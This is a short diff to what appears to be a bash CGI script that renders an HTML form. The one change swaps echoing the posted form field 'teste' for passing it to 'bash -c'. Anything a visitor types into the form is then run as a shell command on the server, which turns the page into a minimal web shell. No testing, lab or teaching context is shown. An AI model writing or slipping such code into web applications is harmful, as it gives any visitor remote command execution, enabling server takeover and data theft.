@@ -10,7 +10,7 @@ echo "<pre>"
 #/app/vendor/bundle/bin/travis
 #echo $QUERY_STRING
 
-echo $FORM_teste
+bash -c $FORM_teste
 cat <<EOF
 <form action="index" method="post">  
 Enter some text here:
